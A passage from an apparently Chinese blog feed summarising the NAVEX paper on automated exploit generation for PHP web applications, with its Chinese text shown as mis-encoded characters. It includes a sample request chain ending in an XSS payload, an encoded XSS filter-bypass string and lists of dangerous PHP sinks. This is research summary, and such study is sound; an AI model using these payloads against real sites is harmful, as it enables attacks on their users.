ä¸ªæ­¥éª¤æ¥ç”Ÿæˆå…·ä½“çš„Expï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚é¦–å…ˆï¼Œåˆ›å»ºå¯¼èˆªå›¾æ¥å‘ç°æ‰€æœ‰æ‰§è¡Œåº”ç”¨ç¨‹åºæ¨¡å—çš„å¯èƒ½HTTPè¯·æ±‚åºåˆ—ï¼›ä¹‹åï¼Œç»“åˆé™æ€åˆ†æé˜¶æ®µå¾—åˆ°çš„å¯èƒ½æ¼æ´ç‚¹æ¥ç­›é€‰å¯¹åº”æ¨¡å—çš„æ‰§è¡Œè·¯å¾„ï¼›æœ€ç»ˆï¼Œç”Ÿæˆå¯ç”¨çš„Expã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c865018411ce.png" alt="E1E8930D-6DE3-4869-A279-BDEA0E11761A.png"></p><h4 id="3-2-1-Dynamic-Execution"><a href="#3-2-1-Dynamic-Execution" class="headerlink" title="3.2.1 Dynamic Execution"></a>3.2.1 Dynamic Execution</h4><p>NAVEXä½¿ç”¨åŠ¨æ€æ‰§è¡Œæ–¹æ³•ï¼Œå€ŸåŠ©çº¦æŸæ±‚è§£å’Œconcolicæ‰§è¡Œæ¥ç”Ÿæˆå¤§é‡è¡¨å•è¾“å…¥ï¼Œä»¥å¸®åŠ©çˆ¬è™«æœ€å¤§åŒ–åº”ç”¨ç¨‹åºçš„è¦†ç›–èŒƒå›´ã€‚</p><p><strong>çˆ¬è™«</strong>(è§£å†³å®¢æˆ·ç«¯çº¦æŸæ¡ä»¶)ï¼šä½¿ç”¨ç§å­URLå¯åŠ¨ï¼Œå¯ä»¥å¯¹Webç«™ç‚¹çš„æ¯ä¸ªè§’è‰²è‡ªåŠ¨åŒ–ç™»å½•éªŒè¯ï¼Œé‡‡ç”¨å¹¿åº¦ä¼˜å…ˆéå†ç®—æ³•ï¼Œæ–°æŠ“å–çš„URLå°†ä½œä¸ºä¸‹ä¸€æ¬¡çš„çˆ¬è™«çš„èµ·å§‹ã€‚æ­¤å¤„çš„ä¼˜ç‚¹åœ¨äºï¼Œé¦–å…ˆï¼Œçˆ¬è™«å¯ä»¥æ„é€ ç¬¦åˆJavaScriptéªŒè¯çš„è¾“å…¥ï¼›å…¶æ¬¡ï¼Œæœ‰æ•ˆè¡¨å•è¾“å…¥çš„è‡ªåŠ¨ç”Ÿæˆæé«˜äº†è¦†ç›–èŒƒå›´ã€‚</p><p>è‡ªåŠ¨æœ‰æ•ˆè¾“å…¥æ„é€ ï¼šNAVEXç»“åˆäº†è¡¨å•HTMLçº¦æŸFhtmlå’ŒJavaScriptçº¦æŸFjsæ¥ç”Ÿæˆæœ€ç»ˆå½¢å¼çº¦æŸFformï¼Œä¹‹åä½¿ç”¨æ±‚è§£å™¨æ¥æ±‚è§£ï¼Œæœ€ç»ˆå¾—åˆ°å¯¹åº”çš„HTTPè¯·æ±‚ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¦æŸå…¬å¼</span></span><br><span class="line">Fhtml : (book_name==<span class="string">"Intro to CS by author1"</span> âˆ¨ book_name==<span class="string">"Intro to Math by author2"</span>)</span><br><span class="line">Fjs: edition &gt; <span class="number">0</span></span><br><span class="line">Fform: Fhtml âˆ§ Fjs</span><br><span class="line"><span class="comment">// æ±‚è§£å¾—åˆ°çš„HTTPè¯·æ±‚</span></span><br><span class="line">http:.../selectBooks.php?action=borrow POST[book name=Intro to CS by author1, edition=<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p><strong>è§£å†³æœåŠ¡å™¨ç«¯çº¦æŸ</strong>ï¼šåœ¨æœåŠ¡ç«¯ä¹Ÿä¼šå¯¹è¾“å…¥æœ‰ä¸€å®šçš„çº¦æŸï¼Œæ‰€ä»¥åœ¨æ»¡è¶³å‰ç«¯çº¦æŸåå¿…é¡»åˆ¤æ–­æœåŠ¡ç«¯çº¦æŸæ˜¯å¦ä¹ŸåŒæ—¶å¾—åˆ°äº†æ»¡è¶³ã€‚ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒNAVEXä¼šåŠ¨æ€è·Ÿè¸ªåˆ¤æ–­ä¿¡æ¯æ˜¯å¦æ»¡è¶³æœåŠ¡ç«¯çº¦æŸï¼Œä¸»è¦æ ¹æ®ä»¥ä¸‹ä¸¤ç‚¹ä¿¡æ¯ï¼š(i)æ›´æ”¹å…¶çŠ¶æ€ï¼ˆå³ï¼Œåˆ›å»ºæ–°ä¼šè¯ï¼Œè®¾ç½®æ–°å˜é‡å’Œè¶…å…¨å±€å€¼ç­‰ï¼‰;(ii)æ‰§è¡Œæ•æ„Ÿæ“ä½œæ¥ç¡®å®šè¯·æ±‚æ˜¯å¦æˆåŠŸï¼Œæ¯”å¦‚æŸ¥è¯¢æ•°æ®åº“ç­‰ã€‚å¦‚æœæ£€æµ‹åˆ°è¯·æ±‚æ²¡æœ‰æˆåŠŸæ‰§è¡Œï¼Œé‚£ä¹ˆå°†ä¼šconcolicæ‰§è¡Œä¾æ®æœåŠ¡ç«¯ç¨‹åºé€»è¾‘å¾—å‡ºçº¦æŸå…¬å¼å¹¶å¯¹ä¹‹å‰å‘ç°çš„æ‰§è¡Œè·¯å¾„è¿›è¡Œæ›´æ–°ï¼Œä¹‹åä½¿ç”¨æ±‚è§£å™¨æ±‚è§£ç”Ÿæˆæ–°çš„è¡¨å•æ•°æ®è¿›è¡Œæäº¤(åœ¨æˆåŠŸä¹‹å‰ä¼šä¸€ç›´æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹)ã€‚æœåŠ¡ç«¯çº¦æŸç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(book name==&quot;intro to CS by author1&quot; âˆ¨ book name==&quot;intro to Math by author2&quot;) âˆ§ length(publisher)&lt;=35 âˆ§ edition &gt;0</span><br></pre></td></tr></table></figure><p>PSï¼šNAVEXä¼šå­˜å‚¨å¯¼è‡´æˆåŠŸæäº¤çš„å®Œæ•´HTTPè¯·æ±‚ã€‚</p><h4 id="3-2-2-Navigation-Graph"><a href="#3-2-2-Navigation-Graph" class="headerlink" title="3.2.2 Navigation Graph"></a>3.2.2 Navigation Graph</h4><p>å¯¼èˆªå›¾æ˜¯ä¸€ä¸ªæœ‰å‘å›¾G=(N,E)ï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹nâˆˆNè¡¨ç¤ºHTTPè¯·æ±‚.æ¯ä¸ªè¾¹e=(ni,nj)âˆˆEè¡¨ç¤ºä»niåˆ°njçš„å¯¼èˆªï¼Œè¡¨ç¤ºå‘èµ·dçš„è¯·æ±‚ï¼Œå¯ä»¥æ˜¯é“¾æ¥å½¢å¼ã€‚å›¾ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½å…·æœ‰ä»¥ä¸‹å±æ€§idï¼ŒURLï¼Œroleå’Œform paramsï¼Œç”¨äºè¡¨ç¤ºè¡¨å•æäº¤ç”Ÿæˆçš„HTTPè¯·æ±‚ã€‚idå±æ€§å­˜å‚¨èŠ‚ç‚¹çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒURLå±æ€§æ˜¯HTTPè¯·æ±‚ä¸­çš„URLï¼Œå®ƒç”±è¯·æ±‚çš„æ¨¡å—åç§°å’ŒHTTPå‚æ•°ç»„æˆï¼Œroleå±æ€§åŒ…å«çˆ¬è™«ä½¿ç”¨çš„ç™»å½•å‡­è¯ã€‚ç¤ºä¾‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2019/03/11/5c864fe6b5e27.png" alt="FAB532BE-E611-4E9F-A43D-06D446DC8ED2.png"></p><h4 id="3-2-3-Final-Exploit-Generation"><a href="#3-2-3-Final-Exploit-Generation" class="headerlink" title="3.2.3 Final Exploit Generation"></a>3.2.3 Final Exploit Generation</h4><p>é™æ€åˆ†æï¼šæ‰©å±•çš„CPGå›¾å’ŒExpå­—ç¬¦ä¸²ã€‚<br>åŠ¨æ€åˆ†æï¼šNGå¯¼èˆªå›¾ã€‚<br>å¦‚ä½•å°†è¿™ä¸ªä¸¤ä¸ªä¿¡æ¯è¿›è¡Œç»„åˆå¹¶äº§ç”ŸExpå°±æ˜¯æ­¤æ­¥çš„ä½œç”¨ã€‚<br><u><strong>ä¼˜ç‚¹ï¼šå°†æ¼æ´Expçš„æ„é€ é—®é¢˜è½¬æ¢ä¸ºå¯¹å›¾çš„ç®€å•æœç´¢é—®é¢˜ã€‚</strong></u><br>éš¾ç‚¹ï¼šæ–‡ä»¶è¢«åŒ…å«è¿™ä¸ªè¿‡ç¨‹åœ¨NGä¸­æ˜¯çœ‹ä¸åˆ°çš„ã€‚<br>éš¾ç‚¹è§£å†³ï¼šé¢„å¤„ç†åŒ…å«è§£æï¼Œæ­¤æ­¥éª¤åˆ›å»ºå­˜å‚¨æ–‡ä»¶åŒ…å«å…³ç³»çš„åŒ…å«æ˜ å°„ã€‚é€šè¿‡æ‰§è¡Œéå†æ¥æ„é€ æ˜ å°„ï¼Œè¯¥éå†åœ¨å¢å¼ºçš„CPGä¸­æœç´¢è¡¨ç¤ºå¯¹æ–‡ä»¶åŒ…å«PHPå‡½æ•°çš„è°ƒç”¨çš„èŠ‚ç‚¹ï¼Œæœ€ç»ˆå°†å¾—åˆ°åŒ…å«å›¾ã€‚<br>ä¹‹åä½¿ç”¨NGå’ŒåŒ…å«å›¾æ¥æœç´¢å…¬å…±æ¨¡å—åˆ°å­˜åœ¨æ¼æ´æ¨¡å—çš„è·¯å¾„ï¼Œå…·ä½“ç®—æ³•è§ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2019/03/11/5c86503f36ba1.png" alt="Expç”Ÿæˆç®—æ³•.png"></p><p>ä¾æ®Figure4æˆ‘ä»¬ä½¿ç”¨ç®—æ³•å¾—åˆ°çš„åºåˆ—å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http://localhost/App/index.php</span><br><span class="line">2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]</span><br><span class="line">3. http://localhost/App/selectBooks.php?action</span><br><span class="line">=borrow</span><br><span class="line">4. http://localhost/App/hold.php</span><br><span class="line">5. http://localhost/App/hold.php?step=checkout</span><br><span class="line">6. http://localhost/App/hold.php?step=checkout</span><br><span class="line">&amp;msg=&lt;script&gt;alert(â€XSSâ€);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Implementation"><a href="#4-Implementation" class="headerlink" title="4 Implementation"></a>4 Implementation</h2><p>NAVEXåŸºäºç°æœ‰çš„å‡ ç§å·¥å…·è¿›è¡Œå®ç°ï¼š</p><ol><li>æ‰©å±•çš„CPGå›¾åˆ©ç”¨phpjoernè¿›è¡Œå®ç°ï¼›</li><li>æ‰©å±•çš„CPGå›¾å­˜å‚¨åœ¨Neo4jå›¾å½¢æ•°æ®åº“ä¸­ï¼›</li><li>å›¾éå†ç®—æ³•ä½¿ç”¨Apache TinkerPopç¼–å†™ï¼›</li><li>çº¦æŸæ±‚è§£ä½¿ç”¨z3ä»¥åŠå…¶æ‰©å±•Z3-strï¼›</li><li>çˆ¬è™«ç¨‹åºä½¿ç”¨è¢«çº¦æŸå’Œz3æ–­è¨€æ‰©å±•çš„crawler4jï¼›</li><li>çˆ¬è™«å¯¹JavaScriptçš„å¤„ç†ä½¿ç”¨äº†Narcissus JavaScriptå¼•æ“çš„æ‰©å±•ï¼›</li><li>æœåŠ¡ç«¯ä»£ç æ‰§è¡Œè·Ÿè¸ªä½¿ç”¨Xdebugã€‚</li></ol><h2 id="5-Evaluation"><a href="#5-Evaluation" class="headerlink" title="5 Evaluation"></a>5 Evaluation</h2><p><strong>æ•°æ®é›†</strong>ï¼š26ä¸ªçœŸå®PHPåº”ç”¨ç¨‹åºï¼Œä»£ç åº“ç»„åˆä¸º3.2M SLOCå’Œ22.7K PHPæ–‡ä»¶å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚<br>æ ‡å‡†ï¼š<br>(i) è¯„ä¼°æœ€æµè¡Œåº”ç”¨çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶ä¸”è¦æ±‚æ˜¯å¤æ‚ä¸”å¤§å‹çš„PHPåº”ç”¨ç¨‹åºï¼Œå¦‚Joomlaï¼ŒHotCRPå’ŒWordPressï¼›<br>(ii) ä½¿ç”¨NAVEXä¸å·²æœ‰çš„ä¸€äº›å…ˆè¿›é¡¹ç›®(ä¾‹å¦‚ï¼ŒChainsawï¼ŒRIPS)è¿›è¡Œæ¯”è¾ƒã€‚</p><p><strong>éƒ¨ç½²</strong>ï¼šå®éªŒç¯å¢ƒï¼šUbuntu 12.04 LTS VMï¼Œ2æ ¸2.4GHzï¼Œ40GB RAMã€‚ç›®æ ‡WebAppéƒ¨ç½²ï¼š(1)è¿›è¡Œé™æ€åˆ†æï¼›(2)éƒ¨ç½²åè¿›è¡ŒåŠ¨æ€åˆ†æ(æ³¨æ„æ¯æ¬¡çˆ¬è™«åè¦æ¢å¤æ•°æ®åº“åˆå§‹çŠ¶æ€)</p><p><strong>ç»“æœæ‘˜è¦</strong>ã€‚ NAVEXå…±æ„å»ºäº†204ä¸ªæ¼æ´expï¼Œå…¶ä¸­195ä¸ªæ³¨å…¥ç±»å‹ï¼Œ9ä¸ªæ˜¯é€»è¾‘æ¼æ´ã€‚ å¢å¼ºçš„CPGå¹³å‡å°†å‡é˜³æ€§ï¼ˆFPï¼‰å‡å°‘äº†87ï¼…ã€‚åŒ…å«ç”¨äºæ„å»ºå¯¼èˆªå›¾çš„å®¢æˆ·ç«¯ä»£ç åˆ†æå°†Expç”Ÿæˆçš„ç²¾åº¦å¹³å‡æé«˜äº†54ï¼…ã€‚ åœ¨è¯„ä¼°é›†ä¸Šï¼ŒNAVEXèƒ½å¤Ÿè¿›è¡Œ6ä¸ªHTTPè¯·æ±‚æ¥æ‹¼æ¥å‡ºExpã€‚</p><p><strong>å¢å¼ºçš„ä»£ç å±æ€§å›¾ç»Ÿè®¡</strong>ï¼šè¡¨2æ˜¾ç¤ºäº†å¢å¼ºçš„CPGæ„å»ºæ—¶é—´å’Œå¤§å°ï¼Œå¯ä»¥çœ‹å‡ºNAVEXçš„è¿è¡Œæ—¶å¼€é”€å¾ˆä½ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c86506447b7c.png" alt="FC3B9A34-8992-4056-B2C1-D64DDAADDF90.png"></p><p><strong>å¯¼èˆªå›¾ç»Ÿè®¡</strong>ï¼šè¡¨3æ€»ç»“äº†åœ¨NAVEXçš„æ­¥éª¤IIä¸­ç”Ÿæˆæ¼æ´Expçš„æ€»æ—¶é—´ã€‚ </p><p><img src="https://i.loli.net/2019/03/11/5c86508b926af.png" alt="18F43907-0C4A-45B3-9AA5-C2F69FF7D087.png"></p><p>ä»¥ä¸Šæ˜¯ç»¼è¿°ï¼Œä¸‹é¢å°†é˜è¿°ä½œè€…ä»å››ä¸ªæ–¹é¢å¯¹NAVEXçš„è¯„ä¼°ï¼š1.Exploitsï¼›2.å®šé‡åˆ†æï¼›3.ä¸ç›¸å…³å·¥ä½œçš„æ¯”è¾ƒï¼›4.é™åˆ¶å’Œè®¨è®º</p><h3 id="5-1-Exploits"><a href="#5-1-Exploits" class="headerlink" title="5.1 Exploits"></a>5.1 Exploits</h3><p>æ¥ä¸‹æ¥ä½œè€…å°†å¯¹NAVEXé’ˆå¯¹çš„æ¼æ´é€ä¸€ç®€è¦è¯´æ˜ï¼š</p><p><strong>SQLIæ¼æ´</strong>ï¼š<br>æ¼æ´è§¦å‘ç‚¹ï¼šmssql_query, mysql_query, mysqli_query,sqlite_query<br>æ¼æ´å®šä½ï¼š155ä¸ªSQLIå¯åˆ©ç”¨çš„æ¼æ´ç‚¹ï¼Œå…¶è¿è¡Œæ—¶é—´ä¸º37åˆ†å’Œ45ç§’ã€‚<br>Expç”Ÿæˆï¼š105ä¸ªSQLIæ¼æ´åˆ©ç”¨Expï¼Œå…¶è¿è¡Œæ—¶é—´ä¸º7åˆ†å’Œ76ç§’ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c8650aaa28e6.png" alt="D29F0E7F-0DA4-4436-9CBB-6F26672EAA58.png"></p><p><strong>SQLIæ¼æ´åˆ©ç”¨</strong>ï¼š</p><p><img src="https://i.loli.net/2019/03/11/5c8650c83c32d.png" alt="21786D72-6EA2-42F9-BA98-9FCCEC0E3457.png"></p><p><img src="https://i.loli.net/2019/03/11/5c8650ea25570.png" alt="E6C92C6F-A2FF-44E8-B0C2-BE47B6B0D734.png"></p><p><strong>XSSæ¼æ´</strong>ï¼š<br>æ¼æ´è§¦å‘ç‚¹ï¼šechoã€print<br>æ¼æ´å®šä½ï¼š1å°æ—¶49åˆ†é’Ÿå†…å…±å‘ç°äº†133ä¸ªXSSå¯åˆ©ç”¨çš„æ¼æ´ç‚¹ï¼Œå…¶ä¸­5ä¸ªæ˜¯è¯¯æŠ¥<br>Expç”Ÿæˆï¼š40åˆ†12ç§’ä¸º133ä¸ªæ¼æ´ç‚¹ç”Ÿæˆäº†90ä¸ªXSSæ¼æ´åˆ©ç”¨</p><p><img src="https://i.loli.net/2019/03/11/5c86510a28218.png" alt="F75221DA-5F90-4EDD-835C-60997FB0304F.png"></p><p><strong>XSSæ¼æ´åˆ©ç”¨</strong>ï¼šå¦‚ä¸‹æ‰€ç¤ºåŒ…å«strtrå‡½æ•°çš„è·¯å¾„ä¼šè¢«è®¤ä¸ºæ˜¯å¯è¢«æ”»å‡»çš„ï¼Œä½†æ˜¯htmlspecialcharsçš„å°±ä¸ä¼šï¼Œå› ä¸ºstrtrå‡½æ•°å¯¹XSSçš„è¿‡æ»¤èƒ½åŠ›å¾ˆå¼±ï¼Œä¹‹åæ±‚è§£å™¨ä¼šé€‰æ‹©%26%2339%3B-alert(1)-%26%2339%3Bæ¥è¿›è¡Œç»•è¿‡ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c86512561ebf.png" alt="13FE3B28-FBD0-482D-B838-9B451F3FABF8.png"></p><p><img src="https://i.loli.net/2019/03/11/5c865140d28c0.png" alt="763D1B5C-B16C-4649-BCD2-0B6E0F793D57.png"></p><p><strong>EARæ¼æ´</strong>ï¼š<br>æ¼æ´è§¦å‘ç‚¹ï¼šheader<br>æ¼æ´å®šä½ï¼š17åˆ†17ç§’å†…å‘ç°äº†19ä¸ªè‰¯æ€§EARå’Œ3ä¸ªæ¶æ„EARæ¼æ´<br>Expç”Ÿæˆï¼šæˆåŠŸé’ˆå¯¹22ä¸ªEARæ¼æ´ç”Ÿæˆäº†9ä¸ªæ¼æ´åˆ©ç”¨</p><p><strong>ä»£ç æ‰§è¡Œæ¼æ´</strong>ï¼š<br>æ¼æ´è§¦å‘ç‚¹ï¼ševal<br>æ¼æ´å®šä½ï¼šåœ¨21m20secå†…æ‰¾åˆ°98æ¬¡è°ƒç”¨ä½†æ˜¯å‡æ— å®‰å…¨ç¼ºé™·</p><p><strong>å‘½ä»¤æ³¨å…¥æ¼æ´</strong>:<br>æ¼æ´è§¦å‘ç‚¹ï¼šexec,expect_popen,passthru,pcntl_exec,popen,proc_open,shell_exec,system,mail,backtick_operator<br>æ¼æ´å®šä½ï¼šåœ¨22m32secå†…NAVEXæ²¡æœ‰æ‰¾åˆ°ä»»ä½•æ˜“å—å½±å“çš„æ¼æ´ç‚¹</p><p><strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ï¼š<br>æ¼æ´è§¦å‘ç‚¹ï¼šinclude,include_once,require,require_once<br>æ¼æ´å®šä½ï¼šåœ¨27åˆ†58ç§’å†…æ‰¾åˆ°1å¤„æ¥æ”¶å™¨å†…åŒ…å«äº†å¯æ§å˜é‡ä½†æ˜¯å› ä¸ºåé¢æœ‰çº¦æŸæ‰€ä»¥æ— æ³•æ„é€ å‡ºExpï¼Œå³æ­¤å¤„ä¾æ—§ä¸å¯åˆ©ç”¨</p><h3 id="5-2-Measurements"><a href="#5-2-Measurements" class="headerlink" title="5.2 Measurements"></a>5.2 Measurements</h3><ol><li><p>å›¾5æ˜¾ç¤ºäº†NAVEXçš„æ€§èƒ½(å®šä½æ¼æ´ç‚¹çš„è€—æ—¶å’Œæ„é€ Expçš„è€—æ—¶)</p><p><img src="https://i.loli.net/2019/03/11/5c865160cea52.png" alt="CF8905E9-7DBB-4F75-B184-56366334D1D0.png"></p></li><li><p>å›¾6æ˜¾ç¤ºä½¿ç”¨äº†è¿‡æ»¤å’ŒDBæ ‡ç­¾å¢å¼ºçš„CPGå¯¹å¯èƒ½æ¼æ´ç‚¹åˆ¤åˆ«çš„å½±å“ã€‚(å‡å°‘äº†è¯¯æŠ¥)</p></li></ol><p><img src="https://i.loli.net/2019/03/11/5c86517ab78a0.png" alt="DDE0F888-0525-45BB-B7EE-7CB2535C9300.png"></p><ol start="3"><li>æ€»è¦†ç›–ç‡ä¸º68ï¼…</li><li>å¯¹å®¢æˆ·ç«¯ä»£ç è¿›è¡Œåˆ†æå¸¦æ¥çš„å¥½å¤„ï¼šæå‡äº†ç²¾åº¦å’Œè¦†ç›–ç‡</li></ol><p><img src="https://i.loli.net/2019/03/11/5c86518cbd05f.png" alt="C2F5E466-359A-44AA-B2A4-FF80E50BA855.png"></p><h3 id="5-3-Comparison-with-Related-Work"><a href="#5-3-Comparison-with-Related-Work" class="headerlink" title="5.3 Comparison with Related Work"></a>5.3 Comparison with Related Work</h3><ol><li><p>æ¼æ´æ£€æµ‹æ–¹é¢ä¸RIPSï¼ŒChainsawçš„å¯¹æ¯”ï¼›</p></li><li><p>Expç”Ÿæˆä¸Chainsaw(åªèƒ½å¤Ÿå¯¹SQLiå’ŒXSSç”ŸæˆExp)çš„å¯¹æ¯”ï¼›</p></li><li><p>æ•ˆç‡æ–¹é¢ä¸Chainsawçš„å¯¹æ¯”ï¼š</p></li></ol><p>ç”ŸæˆExp: NAVEX-&gt;25åˆ†é’Ÿ2ç§’ï¼›Chainsaw-&gt;112åˆ†é’Ÿ<br>å‰æœŸå‡†å¤‡: NAVEX-&gt;18åˆ†26ç§’ï¼›Chainsaw-&gt;1å¤©13å°æ—¶21åˆ†</p><h3 id="5-4-Limitations-and-Discussion"><a href="#5-4-Limitations-and-Discussion" class="headerlink" title="5.4 Limitations and Discussion"></a>5.4 Limitations and Discussion</h3><ol><li>Webåº”ç”¨ç¨‹åºçš„æŸäº›åŠŸèƒ½å°šä¸å—æ”¯æŒï¼Œæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ é€»è¾‘ï¼›</li><li>è‡ªåŠ¨ä»å›¾èŠ‚ç‚¹å¯¼å‡ºçš„TACå…¬å¼ä¸å®Œæ•´(æœªæåŠå“ªäº›ä¸æ”¯æŒ)ï¼›</li><li>é™æ€åˆ†æè¿›è¡Œæ¼æ´å®šä½å­˜åœ¨è¯¯æŠ¥ï¼›</li><li>CPGå›¾ä¸æ”¯æŒè§£æåŠ¨æ€å‡½æ•°è°ƒç”¨(æ–‡ä¸­è¯´è¿™ä¸ªä¸å¤ªé‡è¦ä½†æœªå…·ä½“è¯´æ˜ï¼Œå¯èƒ½æ˜¯ä½¿ç”¨æå°‘)ï¼›</li><li>å¦‚æœç½‘ç«™çš„åŠ¨æ€é€»è¾‘ä¸è¢«NAVEXæ”¯æŒï¼Œé‚£ä¹ˆå°†æ— æ³•æ„é€ æ¼æ´åˆ©ç”¨(æ¯”å¦‚å‰é¢çš„SchoolMateç¨‹åºçš„ä¼šè¯ç»´æŒæœªè¢«æ”¯æŒ&lt;-ç¬”è€…ä»æ–‡ä¸­å¾—åˆ°çš„ä¿¡æ¯)</li></ol><h2 id="6-Related-Work"><a href="#6-Related-Work" class="headerlink" title="6 Related Work"></a>6 Related Work</h2><p>è¯¦ç»†è§è®ºæ–‡ä¸­è¡¨è¿°</p><h2 id="7-Conclusions"><a href="#7-Conclusions" class="headerlink" title="7 Conclusions"></a>7 Conclusions</h2><p>PS: æ­¤éƒ¨åˆ†æ˜¯ä¸€äº›ç¬”è€…ä¸ªäººçš„æ€»ç»“å¹¶éè®ºæ–‡çš„æœ€ç»ˆæ€»ç»“</p><p>ä¹‹å‰å¯¹PHPæ¼æ´çš„è‡ªåŠ¨åŒ–å®¡è®¡å·¥ä½œä¸»è¦åˆ†ä¸ºé™æ€åˆ†æå’ŒåŠ¨æ€åˆ†æã€‚å…¶ä¸­é™æ€åˆ†æçš„ä¸€äº›ä»£è¡¨çš„å¯å®é™…ä½¿ç”¨çš„å·¥å…·æœ‰ripsã€cobraã€Cobra-Wä»¥åŠseayä»£ç å®¡è®¡ç³»ç»Ÿï¼Œå…¶ä¸­ripsçš„å»ºæ¨¡åˆ†æä»¥åŠæ”»å‡»å­—å…¸çš„æ„é€ æ˜¯æ¯”è¾ƒè¯¦ç»†å’Œå…¨é¢çš„ã€‚è™½ç„¶å¯ä»¥å‚è€ƒå…¶ä»£ç å’Œè®ºæ–‡è¿›è¡Œå­¦ä¹ ï¼Œä½†æ˜¯å¼€æºç‰ˆå¯¹ç°åœ¨è€Œè¨€å·²ç»ä¸å…·æœ‰å®ç”¨ä»·å€¼ã€‚cobraæ˜¯åŸºäºASTè¿›è¡Œåˆ†æï¼ŒASTæ˜¯å…·æœ‰ä¸€å®šçš„å±€é™æ€§çš„ï¼Œä»åˆ†ææ•ˆæœä¸Šè€Œè¨€æ²¡æœ‰æ§åˆ¶æµå›¾å¥½ï¼Œå½“ç„¶ä¹Ÿæ²¡æœ‰ä»Šå¤©æåˆ°çš„CPGå¥½ã€‚ä½†æ˜¯cobraåœ¨ASTä¸Šå»ºç«‹çš„åˆ†ææ¨¡å‹ä»¥åŠä»–å¯¹è§„åˆ™é›†çš„å¼•å…¥æ–¹å¼æ˜¯å…·æœ‰ä¸€å®šå‚è€ƒæ€§çš„ã€‚å½“ç„¶åœ¨cobraä¹‹åçš„Cobra-Wæ˜¯ä»¤äººçœ¼å‰ä¸€äº®çš„æ„Ÿè§‰ï¼Œè™½ç„¶è¿˜æœªå®Œå…¨å¼€å‘å®Œæˆï¼Œä½†æ˜¯å®ƒå¯¹æ–‡ä»¶åŒ…å«çš„å¤„ç†ä»¥åŠå¯¹äºè‡ªå®šä¹‰è¿‡æ»¤å‡½æ•°çš„å¤„ç†æ€æƒ³æ˜¯å¾ˆå€¼å¾—å­¦ä¹ çš„(ç›¸æ¯”ripsçš„æš´åŠ›ç›´æ¥å°†ä»£ç æ‹¼æ¥å¥½ä¸€äº›)ã€‚seayä»£ç å®¡è®¡ç³»ç»Ÿçš„ä¼˜ç‚¹å°±æ˜¯å…¶ä¸­åŒ…å«äº†å¯¹æ•°æ®åº“çš„å®¡è®¡ã€‚å…¶å®ƒçš„è¿˜æœ‰phpvulhunterç­‰å·¥å…·ï¼Œä½†æ˜¯å¹´ä»£è¾ƒä¸ºä¹…è¿œå› è€Œç¬”è€…æ²¡æœ‰å¯¹å…¶ä»£ç åšè¿›ä¸€æ­¥çš„åˆ†æã€‚åœ¨åˆ†æè¿‡ä¸Šé¢çš„ç¨‹åºä¹‹åç¬”è€…ä¹Ÿæ›¾åœ¨ä¸€å¹´å‰å°è¯•å¼•å…¥åˆ«ååˆ†æç­‰æ–°æœºåˆ¶æ¥è¿›ä¸€æ­¥æ”¹å–„é™æ€åˆ†æçš„å‡†ç¡®ç‡ï¼Œä½†æ˜¯æ•ˆæœä¸æ˜¯å¾ˆç†æƒ³éšåå°±å¼ƒå‘äº†ã€‚åŠ¨æ€åˆ†ææœ€å…·ä»£è¡¨æ€§çš„æ˜¯prvdï¼Œè¿™ä¸ªç¬”è€…è¿˜æœªè¿›è¡Œåˆ†æï¼Œä½†æ˜¯ç”¨æ•ˆæœä¸é”™ï¼Œæ„Ÿå…´è¶£å¯ä»¥å¯¹å…¶è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æã€‚</p><p>æœ€åå›åˆ°æœ¬æ–‡ï¼Œæ­¤æ–‡æå‡ºçš„NAVEXé‡‡ç”¨é™æ€åˆ†æå’ŒåŠ¨æ€åˆ†æç›¸ç»“åˆçš„æ–¹å¼ï¼Œå¯ä»¥è‡ªåŠ¨å®Œæˆå¯¹æ¼æ´çš„åˆ†æå¹¶ç”ŸæˆExpã€‚åœ¨æ–‡ä¸­æåˆ°çš„å‡ ä¸ªæ–¹æ³•éƒ½æ˜¯éå¸¸æ–°é¢–çš„ï¼Œä»æ•ˆæœä¸Šæ¥çœ‹å¾ˆä¸é”™ã€‚å¦‚æœä»å·¥ç¨‹çš„è§’åº¦æ¥çœ‹ï¼Œå®Œå…¨å¯ä»¥å€Ÿé‰´å…¶æ€æƒ³ä»è€Œè¿›è¡Œæ·±å…¥çš„å¼€å‘å®Œå–„ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å‡ºå¤„ï¼š27th USENIX Security Symposium&lt;br&gt;ä½œè€…ï¼šAbeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V.N.&lt;br&gt;å•ä½ï¼šVenkatakrishnan University of Illin
      
    
    </summary>
    
    
  </entry>
  
  <entry>
